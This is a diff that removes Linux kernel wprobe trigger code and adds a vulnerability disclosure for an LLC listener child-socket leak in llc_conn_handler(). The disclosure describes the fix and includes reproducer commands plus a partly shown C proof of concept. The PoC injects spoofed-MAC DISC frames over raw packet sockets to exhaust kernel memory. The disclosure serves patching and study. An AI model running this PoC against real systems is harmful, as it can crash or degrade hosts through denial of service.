-+	 */
-+	atomic_set(&tw->work_pending, 0);
-+}
-+
-+static void wprobe_irq_work_func(struct irq_work *irq_work)
-+{
-+	struct trace_wprobe *tw = container_of(irq_work, struct trace_wprobe, irq_work);
-+
-+	schedule_work(&tw->work);
-+}
-+
- static void free_trace_wprobe(struct trace_wprobe *tw)
- {
- 	if (tw) {
-+		if (tw->work.func) {
-+			irq_work_sync(&tw->irq_work);
-+			cancel_work_sync(&tw->work);
-+		}
- 		trace_probe_cleanup(&tw->tp);
- 		kfree(tw->symbol);
- 		kfree(tw);
-@@ -231,6 +300,12 @@ static struct trace_wprobe *alloc_trace_wprobe(const char *group,
- 	if (!tw)
- 		return ERR_PTR(-ENOMEM);
- 
-+	raw_spin_lock_init(&tw->lock);
-+	init_irq_work(&tw->irq_work, wprobe_irq_work_func);
-+	INIT_WORK(&tw->work, wprobe_work_func);
-+	atomic_set(&tw->missed, 0);
-+	atomic_set(&tw->work_pending, 0);
-+
- 	if (symbol) {
- 		tw->symbol = kstrdup(symbol, GFP_KERNEL);
- 		if (!tw->symbol)
-@@ -509,6 +584,11 @@ static bool trace_wprobe_is_valid_addr(unsigned long addr, int len)
- 	return true;
- }
- 
-+#ifdef CONFIG_WPROBE_TRIGGERS
-+static u64 wprobe_trigger_clear_target __aligned(8);
-+#define WPROBE_DEFAULT_CLEAR_ADDRESS ((unsigned long)&wprobe_trigger_clear_target)
-+#endif
-+
- static int parse_address_spec(const char *spec, unsigned long *addr, int *type,
- 			      int *len, char **symbol, int *offset)
- {
-@@ -572,7 +652,13 @@ static int parse_address_spec(const char *spec, unsigned long *addr, int *type,
- 		}
- 	}
- 
-+#ifdef CONFIG_WPROBE_TRIGGERS
-+	if (strcmp(at + 1, "-1") == 0) {
-+		_addr = WPROBE_DEFAULT_CLEAR_ADDRESS;
-+	} else if (kstrtoul(at + 1, 0, &_addr) != 0) {
-+#else
- 	if (kstrtoul(at + 1, 0, &_addr) != 0) {
-+#endif
- 		char *off_str = strpbrk(at + 1, "+-");
- 
- 		if (off_str) {
-@@ -756,6 +842,10 @@ static int trace_wprobe_show(struct seq_file *m, struct dyn_event *ev)
- 				   tw->offset, len);
- 		else
- 			seq_printf(m, " %s@%s:%d", type_str, tw->symbol, len);
-+#ifdef CONFIG_WPROBE_TRIGGERS
-+	} else if (tw->addr == WPROBE_DEFAULT_CLEAR_ADDRESS) {
-+		seq_printf(m, " %s@-1:%d", type_str, len);
-+#endif
- 	} else {
- 		seq_printf(m, " %s@0x%lx:%d", type_str, tw->addr, len);
- 	}
-@@ -773,3 +863,522 @@ static __init int init_wprobe_trace(void)
- }
- fs_initcall(init_wprobe_trace);
- 
-+#ifdef CONFIG_WPROBE_TRIGGERS
-+
-+#define SET_WPROBE_STR		"set_wprobe"
-+#define CLEAR_WPROBE_STR	"clear_wprobe"
-+#define wprobe_trigger_log_err(file, glob, offs, err) \
-+	tracing_log_err((file)->tr, "wprobe_trigger", glob, \
-+			trace_probe_err_text, TP_ERR_##err, offs)
-+
-+struct wprobe_trigger_data {
-+	struct rcu_head		rcu;
-+	struct trace_event_file	*file;
-+	struct trace_wprobe	*tw;
-+	int			offset;
-+	long			adjust;
-+	const char		*field;
-+	bool			clear;
-+};
-+
-+static void wprobe_trigger(struct event_trigger_data *data,
-+			   struct trace_buffer *buffer,  void *rec,
-+			   struct ring_buffer_event *event)
-+{
-+	struct wprobe_trigger_data *wprobe_data = data->private_data;
-+	struct trace_wprobe *tw = wprobe_data->tw;
-+	unsigned long addr = 0, flags;
-+	bool changed = false;
-+
-+	if (in_nmi()) {
-+		atomic_inc(&tw->missed);
-+		return;
-+	}
-+
-+	if (wprobe_data->field) {
-+		addr = *(unsigned long *)((char *)rec + wprobe_data->offset);
-+		addr += wprobe_data->adjust;
-+	}
-+
-+	raw_spin_lock_irqsave(&tw->lock, flags);
-+
-+	if (!wprobe_data->clear) {
-+		if (!trace_wprobe_is_valid_addr(addr, tw->len)) {
-+			atomic_inc(&tw->missed);
-+			goto out;
-+		}
-+		if (tw->addr == WPROBE_DEFAULT_CLEAR_ADDRESS) {
-+			/* Skip if a previous work is still propagating the address */
-+			if (atomic_read(&tw->work_pending)) {
-+				atomic_inc(&tw->missed);
-+				goto out;
-+			}
-+			WRITE_ONCE(tw->addr, addr);
-+			changed = true;
-+			clear_bit(EVENT_FILE_FL_SOFT_DISABLED_BIT, &wprobe_data->file->flags);
-+		}
-+	} else {
-+		if (tw->addr != WPROBE_DEFAULT_CLEAR_ADDRESS) {
-+			/* Skip if a previous work is still propagating the address */
-+			if (atomic_read(&tw->work_pending)) {
-+				atomic_inc(&tw->missed);
-+				goto out;
-+			}
-+			if (!wprobe_data->field || tw->addr == addr) {
-+				WRITE_ONCE(tw->addr, WPROBE_DEFAULT_CLEAR_ADDRESS);
-+				changed = true;
-+				set_bit(EVENT_FILE_FL_SOFT_DISABLED_BIT, &wprobe_data->file->flags);
-+			}
-+		}
-+	}
-+
-+	if (changed) {
-+		/*
-+		 * Mark the work as pending before queuing irq_work so that
-+		 * subsequent triggers skip updating tw->addr until the work
-+		 * has finished propagating the address to all CPUs.
-+		 */
-+		atomic_set(&tw->work_pending, 1);
-+		irq_work_queue(&tw->irq_work);
-+	}
-+
-+out:
-+	raw_spin_unlock_irqrestore(&tw->lock, flags);
-+}
-+
-+static void free_wprobe_trigger_data(struct wprobe_trigger_data *wprobe_data)
-+{
-+	if (wprobe_data) {
-+		kfree(wprobe_data->field);
-+		kfree(wprobe_data);
-+	}
-+}
-+DEFINE_FREE(free_wprobe_trigger_data, struct wprobe_trigger_data *, free_wprobe_trigger_data(_T));
-+
-+static void free_private_wprobe_trigger_data(struct event_trigger_data *data)
-+{
-+	free_wprobe_trigger_data(data->private_data);
-+}
-+
-+static int wprobe_trigger_print(struct seq_file *m,
-+			       struct event_trigger_data *data)
-+{
-+	struct wprobe_trigger_data *wprobe_data = data->private_data;
-+	int missed = atomic_read(&wprobe_data->tw->missed);
-+
-+	if (wprobe_data->clear) {
-+		seq_printf(m, "%s:%s", CLEAR_WPROBE_STR,
-+			   trace_event_name(wprobe_data->file->event_call));
-+		if (wprobe_data->field) {
-+			seq_printf(m, ":%s%+ld",
-+				   wprobe_data->field, wprobe_data->adjust);
-+		}
-+	} else {
-+		seq_printf(m, "%s:%s:%s%+ld", SET_WPROBE_STR,
-+			   trace_event_name(wprobe_data->file->event_call),
-+			   wprobe_data->field, wprobe_data->adjust);
-+	}
-+
-+	if (data->count == -1)
-+		seq_puts(m, ":unlimited");
-+	else
-+		seq_printf(m, ":count=%ld", data->count);
-+
-+	if (data->filter_str)
-+		seq_printf(m, " if %s", data->filter_str);
-+
-+	if (missed)
-+		seq_printf(m, " # missed: %d", missed);
-+
-+	seq_putc(m, '\n');
-+
-+	return 0;
-+}
-+
-+static struct wprobe_trigger_data *
-+wprobe_trigger_alloc(struct trace_wprobe *tw, struct trace_event_file *file,
-+		     bool clear)
-+{
-+	struct wprobe_trigger_data *wprobe_data;
-+
-+	wprobe_data = kzalloc_obj(*wprobe_data);
-+	if (!wprobe_data)
-+		return NULL;
-+
-+	wprobe_data->tw = tw;
-+	wprobe_data->clear = clear;
-+	wprobe_data->file = file;
-+
-+	return wprobe_data;
-+}
-+
-+static void wprobe_trigger_free(struct event_trigger_data *data)
-+{
-+	struct wprobe_trigger_data *wprobe_data = data->private_data;
-+
-+	if (WARN_ON_ONCE(data->ref <= 0))
-+		return;
-+
-+	data->ref--;
-+	if (!data->ref) {
-+		/* Remove the SOFT_MODE flag */
-+		trace_event_enable_disable(wprobe_data->file, 0, 1);
-+		trace_event_put_ref(wprobe_data->file->event_call);
-+		trigger_data_free(data);
-+	}
-+}
-+
-+static int wprobe_trigger_cmd_parse(struct event_command *cmd_ops,
-+				    struct trace_event_file *file,
-+				    char *glob, char *cmd,
-+				    char *param_and_filter)
-+{
-+	/*
-+	 * set_wprobe:EVENT:FIELD[+OFFS]
-+	 * clear_wprobe:EVENT[:FIELD[+OFFS]]
-+	 */
-+	struct wprobe_trigger_data *wprobe_data = NULL;
-+	struct event_trigger_data *trigger_data = NULL;
-+	struct trace_event_file *wprobe_file;
-+	struct trace_array *tr = file->tr;
-+	char *event_str, *field_str, *comment;
-+	struct ftrace_event_field *field;
-+	struct trace_event_call *event;
-+	bool remove, clear = false;
-+	unsigned long orig_addr = 0;
-+	struct trace_wprobe *tw;
-+	char *param, *filter;
-+	int ret;
-+
-+	remove = event_trigger_check_remove(glob);
-+
-+	if (!strcmp(cmd, CLEAR_WPROBE_STR))
-+		clear = true;
-+
-+	if (param_and_filter) {
-+		/* Recover original trigger string to show the error log correctly. */
-+		if (*(param_and_filter - 1) == '\0')
-+			*(param_and_filter - 1) = ':';
-+		comment = strchr(param_and_filter, '#');
-+		if (comment)
-+			*comment = '\0';
-+	}
-+
-+	if (event_trigger_empty_param(param_and_filter)) {
-+		wprobe_trigger_log_err(file, glob, strlen(cmd) + 1, WPROBE_NOT_FOUND);
-+		return -EINVAL;
-+	}
-+
-+	ret = event_trigger_separate_filter(param_and_filter, &param, &filter, true);
-+	if (ret)
-+		return ret;
-+
-+	if (file->event_call->flags & TRACE_EVENT_FL_KPROBE) {
-+		wprobe_trigger_log_err(file, glob, 0, WPROBE_ON_KPROBE);
-+		return -EOPNOTSUPP;
-+	}
-+
-+	event_str = strsep(&param, ":");
-+
-+	/* Find target wprobe */
-+	tw = find_trace_wprobe(event_str, WPROBE_EVENT_SYSTEM);
-+	if (!tw) {
-+		wprobe_trigger_log_err(file, glob, event_str - glob, WPROBE_NOT_FOUND);
-+		return -ENOENT;
-+	}
-+	/* The target wprobe must not be used (unless clear) */
-+	if (!remove && !clear && trace_probe_is_enabled(&tw->tp)) {
-+		wprobe_trigger_log_err(file, glob, event_str - glob, WPROBE_BUSY);
-+		return -EBUSY;
-+	}
-+
-+	wprobe_file = find_event_file(tr, WPROBE_EVENT_SYSTEM, event_str);
-+	if (!wprobe_file) {
-+		wprobe_trigger_log_err(file, glob, event_str - glob, WPROBE_NOT_FOUND);
-+		return -EINVAL;
-+	}
-+
-+	wprobe_data = wprobe_trigger_alloc(tw, wprobe_file, clear);
-+	if (!wprobe_data)
-+		return -ENOMEM;
-+
-+	/* clear_wprobe does not need field, but can have optional field. */
-+	if (!clear) {
-+		char *offs;
-+
-+		/* Find target field, which must be equivalent to "void *" */
-+		field_str = strsep(&param, ":");
-+		if (!field_str) {
-+			wprobe_trigger_log_err(file, glob, strlen(glob), WPROBE_NEED_FIELD);
-+			ret = -EINVAL;
-+			goto out_free;
-+		}
-+
-+		offs = strpbrk(field_str, "+-");
-+		if (offs) {
-+			long val;
-+
-+			if (kstrtol(offs, 0, &val) < 0) {
-+				wprobe_trigger_log_err(file, glob, offs - glob, BAD_DEREF_OFFS);
-+				ret = -EINVAL;
-+				goto out_free;
-+			}
-+			wprobe_data->adjust = val;
-+			*offs = '\0';
-+		}
-+
-+		event = file->event_call;
-+		field = trace_find_event_field(event, field_str);
-+		if (!field) {
-+			wprobe_trigger_log_err(file, glob, field_str - glob, NO_EVENT_FIELD);
-+			ret = -ENOENT;
-+			goto out_free;
-+		}
-+
-+		if (field->size != sizeof(void *)) {
-+			wprobe_trigger_log_err(file, glob, field_str - glob, WPROBE_BAD_FIELD);
-+			ret = -ENOEXEC;
-+			goto out_free;
-+		}
-+		wprobe_data->offset = field->offset;
-+		wprobe_data->field = kstrdup(field_str, GFP_KERNEL);
-+		if (!wprobe_data->field) {
-+			ret = -ENOMEM;
-+			goto out_free;
-+		}
-+	} else if (param && (isalpha(param[0]) || param[0] == '_')) {
-+		if (strncmp(param, "count=", 6) != 0 &&
-+		    strncmp(param, "unlimited", 9) != 0) {
-+			char *offs;
-+
-+			field_str = strsep(&param, ":");
-+			offs = strpbrk(field_str, "+-");
-+			if (offs) {
-+				long val;
-+
-+				if (kstrtol(offs, 0, &val) < 0) {
-+					wprobe_trigger_log_err(file, glob,
-+							       offs - glob,
-+							       BAD_DEREF_OFFS);
-+					ret = -EINVAL;
-+					goto out_free;
-+				}
-+				wprobe_data->adjust = val;
-+				*offs = '\0';
-+			}
-+
-+			event = file->event_call;
-+			field = trace_find_event_field(event, field_str);
-+			if (!field) {
-+				wprobe_trigger_log_err(file, glob,
-+						       field_str - glob,
-+						       NO_EVENT_FIELD);
-+				ret = -ENOENT;
-+				goto out_free;
-+			}
-+
-+			if (field->size != sizeof(void *)) {
-+				wprobe_trigger_log_err(file, glob,
-+						       field_str - glob,
-+						       WPROBE_BAD_FIELD);
-+				ret = -ENOEXEC;
-+				goto out_free;
-+			}
-+			wprobe_data->offset = field->offset;
-+			wprobe_data->field = kstrdup(field_str, GFP_KERNEL);
-+			if (!wprobe_data->field) {
-+				ret = -ENOMEM;
-+				goto out_free;
-+			}
-+		}
-+	}
-+
-+	trigger_data = trigger_data_alloc(cmd_ops, cmd, param, wprobe_data);
-+	if (!trigger_data) {
-+		ret = -ENOMEM;
-+		goto out_free;
-+	}
-+
-+	trigger_data->private_data_free = free_private_wprobe_trigger_data;
-+
-+	if (remove) {
-+		event_trigger_unregister(cmd_ops, file, glob+1, trigger_data);
-+		trigger_data_free(trigger_data);
-+		return 0;
-+	}
-+
-+	/* Up the trigger_data count to make sure nothing frees it on failure */
-+	event_trigger_init(trigger_data);
-+
-+	ret = event_trigger_parse_num(param, trigger_data);
-+	if (ret) {
-+		wprobe_trigger_log_err(file, glob, param - glob, BAD_IMM);
-+		goto out_free_trigger;
-+	}
-+
-+	ret = event_trigger_set_filter(cmd_ops, file, filter, trigger_data);
-+	if (ret < 0)
-+		goto out_free_trigger;
-+
-+	/* Soft-enable (register) wprobe event on WPROBE_DEFAULT_CLEAR_ADDRESS */
-+	if (!trace_event_try_get_ref(wprobe_file->event_call)) {
-+		ret = -ENODEV;
-+		goto out_free_trigger;
-+	}
-+
-+	if (!clear) {
-+		orig_addr = tw->addr;
-+		WRITE_ONCE(tw->addr, WPROBE_DEFAULT_CLEAR_ADDRESS);
-+	}
-+
-+	ret = trace_event_enable_disable(wprobe_file, 1, 1);
-+	if (ret < 0) {
-+		if (!clear)
-+			WRITE_ONCE(tw->addr, orig_addr);
-+		goto out_put;
-+	}
-+
-+	ret = event_trigger_register(cmd_ops, file, glob, trigger_data);
-+	if (ret)
-+		goto out_disable;
-+
-+	/* Balance the event_trigger_init() at registration start */
-+	event_trigger_free(trigger_data);
-+	return 0;
-+
-+out_disable:
-+	if (!clear)
-+		WRITE_ONCE(tw->addr, orig_addr);
-+	trace_event_enable_disable(wprobe_file, 0, 1);
-+out_put:
-+	trace_event_put_ref(wprobe_file->event_call);
-+out_free_trigger:
-+	event_trigger_reset_filter(cmd_ops, trigger_data);
-+	trigger_data_free(trigger_data);
-+	return ret;
-+
-+out_free:
-+	free_wprobe_trigger_data(wprobe_data);
-+	return ret;
-+}
-+
-+/* Return event_trigger_data if there is a trigger which points the same wprobe */
-+static struct event_trigger_data *
-+wprobe_trigger_find_same(struct event_trigger_data *test,
-+			 struct trace_event_file *file)
-+{
-+	struct wprobe_trigger_data *test_wprobe_data = test->private_data;
-+	struct wprobe_trigger_data *wprobe_data;
-+	struct event_trigger_data *iter;
-+
-+	list_for_each_entry(iter, &file->triggers, list) {
-+		wprobe_data = iter->private_data;
-+		if (!wprobe_data ||
-+		    iter->cmd_ops->trigger_type !=
-+		    test->cmd_ops->trigger_type)
-+			continue;
-+		if (wprobe_data->tw == test_wprobe_data->tw &&
-+		    wprobe_data->clear == test_wprobe_data->clear)
-+			return iter;
-+	}
-+	return NULL;
-+}
-+
-+static int wprobe_register_trigger(char *glob,
-+				   struct event_trigger_data *data,
-+				   struct trace_event_file *file)
-+{
-+	int ret = 0;
-+
-+	lockdep_assert_held(&event_mutex);
-+
-+	/* The same wprobe is not accept on the same file (event) */
-+	if (wprobe_trigger_find_same(data, file))
-+		return -EEXIST;
-+
-+	if (data->cmd_ops->init) {
-+		ret = data->cmd_ops->init(data);
-+		if (ret < 0)
-+			return ret;
-+	}
-+
-+	list_add_rcu(&data->list, &file->triggers);
-+
-+	update_cond_flag(file);
-+	ret = trace_event_trigger_enable_disable(file, 1);
-+	if (ret < 0) {
-+		list_del_rcu(&data->list);
-+		update_cond_flag(file);
-+		if (data->cmd_ops->free)
-+			data->cmd_ops->free(data);
-+	}
-+	return ret;
-+}
-+
-+static void wprobe_unregister_trigger(char *glob,
-+				      struct event_trigger_data *test,
-+				      struct trace_event_file *file)
-+{
-+	struct event_trigger_data *data;
-+
-+	lockdep_assert_held(&event_mutex);
-+
-+	data = wprobe_trigger_find_same(test, file);
-+	if (!data)
-+		return;
-+
-+	list_del_rcu(&data->list);
-+	trace_event_trigger_enable_disable(file, 0);
-+	update_cond_flag(file);
-+	tracepoint_synchronize_unregister();
-+	if (data->cmd_ops->free)
-+		data->cmd_ops->free(data);
-+}
-+
-+static struct event_command trigger_wprobe_set_cmd = {
-+	.name			= SET_WPROBE_STR,
-+	.trigger_type		= ETT_EVENT_WPROBE,
-+	/* This triggers after when the event is recorded. */
-+	.flags			= EVENT_CMD_FL_NEEDS_REC,
-+	.parse			= wprobe_trigger_cmd_parse,
-+	.reg			= wprobe_register_trigger,
-+	.unreg			= wprobe_unregister_trigger,
-+	.set_filter		= set_trigger_filter,
-+	.trigger		= wprobe_trigger,
-+	.count_func		= event_trigger_count,
-+	.print			= wprobe_trigger_print,
-+	.init			= event_trigger_init,
-+	.free			= wprobe_trigger_free,
-+};
-+
-+static struct event_command trigger_wprobe_clear_cmd = {
-+	.name			= CLEAR_WPROBE_STR,
-+	.trigger_type		= ETT_EVENT_WPROBE,
-+	/* This triggers after when the event is recorded. */
-+	.flags			= EVENT_CMD_FL_NEEDS_REC,
-+	.parse			= wprobe_trigger_cmd_parse,
-+	.reg			= wprobe_register_trigger,
-+	.unreg			= wprobe_unregister_trigger,
-+	.set_filter		= set_trigger_filter,
-+	.trigger		= wprobe_trigger,
-+	.count_func		= event_trigger_count,
-+	.print			= wprobe_trigger_print,
-+	.init			= event_trigger_init,
-+	.free			= wprobe_trigger_free,
-+};
-+
-+static __init int init_trigger_wprobe_cmds(void)
-+{
-+	int ret;
-+
-+	ret = register_event_command(&trigger_wprobe_set_cmd);
-+	if (WARN_ON(ret < 0))
-+		return ret;
-+	ret = register_event_command(&trigger_wprobe_clear_cmd);
-+	if (WARN_ON(ret < 0))
-+		unregister_event_command(&trigger_wprobe_set_cmd);
-+
-+	return ret;
-+}
-+fs_initcall(init_trigger_wprobe_cmds);
-+#endif /* CONFIG_WPROBE_TRIGGERS */
+Bug details:
+
+llc_conn_handler() creates a passive-open child for every frame matched by an
+LLC listener. The child is immediately inserted in the SAP tables and takes a
+device reference, before the LLC state machine proves that the frame is a real
+passive open and before LLC_CONN_PRIM makes it available to accept().
+
+A non-SABME frame never reaches that indication. The old path therefore leaves
+a published child behind which accept() cannot return. The same lifecycle gap
+also remains for SABME traffic when direct processing, backlog enqueue, or
+backlog processing exits before LLC_CONN_PRIM, and when a listener is closed
+with queued but unaccepted children.
+
+The crash PoC is the DISC path only: a PF_LLC SOCK_STREAM listener plus
+injected DISC commands, each with a unique source MAC. On the original
+unfixed kernel, 100 such frames left 100 leftover entries in
+/proc/net/llc/socket after the listener process exited, and deleting the
+listener interface then stalled in unregister_netdevice because those
+children still held the device. Repeating that traffic until the 2 GB
+guest is exhausted is what produces the panic_on_oom log below. That
+stack is out_of_memory() from a later page fault in the PoC process; it
+does not contain llc_conn_handler(). The panic was captured on 6.12.74
+and decoded with a rebuilt 6.12.74 vmlinux (DEBUG_INFO=y, KASAN=y). A
+few lockdep helper frames still show original offsets.
+
+SABME is a legitimate passive open and is not the crash trigger.
+poc-sabme.c exercises the extra lifecycle paths that share the same
+child publication gap: accept() after SABME, and close() of the listener
+without accept().
+
+The fix creates children only for SABME commands. DISC and other commands that
+need an ADM-state DM reply are answered directly from the listener using the
+packet source address, while other non-SABME traffic is dropped without driving
+the listener state machine.
+
+For SABME, the child remains in the SAP tables during passive open so tuple
+lookup continues to win over the listener. The patch tracks children through
+pending and queued states, routes packets for a pending child through the
+listener-side handshake, and removes any child that has not been accepted when
+a failure, backlog drop, or listener close occurs. Cleanup is not gated on the
+current TCP state, so children are also released if the socket leaves
+TCP_LISTEN before close. Redirected packets that observe SOCK_DEAD on the
+listener also release the pending child in llc_conn_handler(), so that path
+does not depend only on close() draining the backlog. A redirected frame
+that fails to enqueue on the listener backlog is dropped without tearing
+down the already pending child. close() walks the listener's remaining
+incoming children after draining sk_receive_queue, so PENDING sockets
+that never reached the accept queue are still released. Handshake skbs
+keep a child socket reference with skb_set_owner_sk_safe(), so
+kfree_skb() on drop, accept-failure, and close paths cannot race the
+asynchronous teardown destructor. Process-context child-lock acquisition
+is serialized with bottom halves disabled. Final child destruction is
+deferred to process context so its timers can be synchronized safely,
+and that work does not lock the listener. The work orphans the child and
+drops the device reference before llc_sk_free().
+
+accept() rejects a connection indication whose skb->sk is the listening
+socket itself, so it cannot lock_sock_nested() the sock it already holds.
+The extra hold taken when a child becomes QUEUED is dropped only when that
+hold was taken, including on close() of leftover incoming_children. Leftover
+frames on the listener backlog for an incoming child run on that child; if
+teardown has already moved it out of service, the frame is dropped instead
+of driving the child's state machine from the listener's llc->state.
+Out-of-service tests on the receive path apply to incoming children, and
+to a looked-up socket that teardown has already marked out of service.
+SAP unhash is RCU, so that child can still be found until the grace
+period ends; the frame is dropped there instead of running the state
+machine with state 0. This is not a generic llc_conn_service bounds
+check.
+
+The listener-side child is already created and published to the SAP
+tables before LLC_CONN_PRIM in d389424e00f9's parent, with no rollback
+if processing exits early. git history first contains that behaviour in
+1da177e4c3f4 ("Linux-2.6.12-rc2"), so Fixes points there.
+
+This revision drops the follow-up LLC_CONN_OUT_OF_SVC bounds patch. Kees
+Cook posted a more complete net-next series for that overlap, and review
+of v6 2/2 also noted the unlatched state-table index and the possible +1
+connect(2) return. The listener child leak remains independent of that
+series.
+
+PF_LLC sockets can only be created in init_net and need CAP_NET_RAW.
+unshare -Urn is not used, because a user-plus-net namespace rejects
+PF_LLC with EAFNOSUPPORT. The reproducer therefore creates a veth pair
+and injects AF_PACKET frames in init_net.
+
+The reproducer writes panic_on_oom only to turn the final memory
+exhaustion into stable crash evidence after leftover LLC sockets are
+already visible in /proc/net/llc/socket. It is not a prerequisite for
+the leak itself.
+
+packetdrill was not used here because the trigger depends on combining a PF_LLC
+listening socket with raw AF_PACKET injection over a veth pair while rotating
+the source MAC address to force distinct passive-open children. The PoC is
+centered on that listener-plus-raw-packet resource leak path rather than on a
+packetdrill-friendly timing script.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    gcc -O2 -static -o poc-sabme poc-sabme.c
+    ip link add llc_rx0 type veth peer name llc_tx0
+    ip link set llc_rx0 address 02:11:22:33:44:55
+    ip link set llc_tx0 address 02:11:22:33:44:66
+    ip link set llc_rx0 up
+    ip link set llc_tx0 up
+    ./poc llc_rx0 llc_tx0 110000
+
+The crash command above is the DISC injector. The extra SABME paths are:
+
+    ./poc-sabme accept llc_rx0 llc_tx0
+    ./poc-sabme close llc_rx0 llc_tx0 100
+
+For deterministic crash evidence only, after leftover LLC sockets are
+already visible in /proc/net/llc/socket, we additionally set:
+
+    echo 2 > /proc/sys/vm/panic_on_oom
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/if_arp.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/if.h>
+#include <linux/llc.h>
+#include <net/ethernet.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef AF_LLC
+#define AF_LLC 26
+#endif
+
+#define DEFAULT_RX_IF "llc_rx0"
+#define DEFAULT_TX_IF "llc_tx0"
+#define DEFAULT_SAP 0xc0
+#define DEFAULT_REPORT_EVERY 10000ULL
+
+static void die_errno(const char *what)
+{
+	perror(what);
+	exit(EXIT_FAILURE);
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"usage: %s [rx_if] [tx_if] [count]\n"
+		"  rx_if: LLC listener interface (default: %s)\n"
+		"  tx_if: raw packet sender interface (default: %s)\n"
+		"  count: number of DISC frames to send, 0 means forever\n",
+		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
+}
+
+static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
+{
+	struct ifreq ifr;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFHWADDR)");
+
+	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+	close(fd);
+}
+
+static int get_ifindex(const char *ifname)
+{
+	struct ifreq ifr;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFINDEX)");
+
+	close(fd);
+	return ifr.ifr_ifindex;
+}
+
+static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
+{
+	struct sockaddr_llc addr;
+	int fd;
+
+	fd = socket(AF_LLC, SOCK_STREAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_LLC)");
+
+	get_if_hwaddr(ifname, mac);
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sllc_family = AF_LLC;
+	addr.sllc_arphrd = ARPHRD_ETHER;
+	addr.sllc_sap = sap;
+	memcpy(addr.sllc_mac, mac, ETH_ALEN);
+
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die_errno("bind(AF_LLC)");
+	if (listen(fd, 16) < 0)
+		die_errno("listen(AF_LLC)");
+
+	return fd;
+}
+
+static int make_packet_socket(const char *ifname, int *ifindex_out)
+{
+	struct sockaddr_ll sll;
+	int fd;
+	int one = 1;
+	int ifindex = get_ifindex(ifname);
+
+	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if (fd < 0)
+		die_errno("socket(AF_PACKET)");
+
+	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
+
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_protocol = htons(ETH_P_ALL);
+	sll.sll_ifindex = ifindex;
+
+	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
+		die_errno("bind(AF_PACKET)");
+
+	*ifindex_out = ifindex;
+	return fd;
+}
+
+static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
+{
+	mac[0] = 0x02;
+	mac[1] = (n >> 32) & 0xff;
+	mac[2] = (n >> 24) & 0xff;
+	mac[3] = (n >> 16) & 0xff;
+	mac[4] = (n >> 8) & 0xff;
+	mac[5] = n & 0xff;
+}
+
+int main(int argc, char **argv)
+{
+	static unsigned char frame[ETH_ZLEN];
+	unsigned char dst_mac[ETH_ALEN];
+	unsigned char src_mac[ETH_ALEN];
+	struct sockaddr_ll sll;
+	const char *rx_if = DEFAULT_RX_IF;
+	const char *tx_if = DEFAULT_TX_IF;
+	uint64_t count = 0;
+	uint64_t i = 1;
+	int listener_fd;
+	int packet_fd;
+	int ifindex;
+
+	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
+		usage(argv[0]);
+		return 0;
+	}
+	if (argc > 1)
+		rx_if = argv[1];
+	if (argc > 2)
+		tx_if = argv[2];
+	if (argc > 3) {
+		char *end = NULL;
+
+		errno = 0;
+		count = strtoull(argv[3], &end, 0);
+		if (errno || !end || *end != '\0') {
+			fprintf(stderr, "invalid count: %s\n", argv[3]);
+			return EXIT_FAILURE;
+		}
+	}
+	if (argc > 4) {
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
+	packet_fd = make_packet_socket(tx_if, &ifindex);
+
+	memset(frame, 0, sizeof(frame));
+	memcpy(frame, dst_mac, ETH_ALEN);
+	((struct ethhdr *)frame)->h_proto = htons(3);
+	frame[ETH_HLEN + 0] = DEFAULT_SAP;
+	frame[ETH_HLEN + 1] = 0x04;
+	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */
+
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_ifindex = ifindex;
+	sll.sll_halen = ETH_ALEN;
+	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);
+
+	fprintf(stderr,
+		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
+		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
+	fprintf(stderr,
+		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
+		dst_mac[0], dst_mac[1], dst_mac[2],
+		dst_mac[3], dst_mac[4], dst_mac[5]);
+	fprintf(stderr,
+		"sending LLC DISC commands with a unique spoofed source MAC each time\n");
+
+	while (!count || i <= count) {
+		fill_src_mac(src_mac, i);
+		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
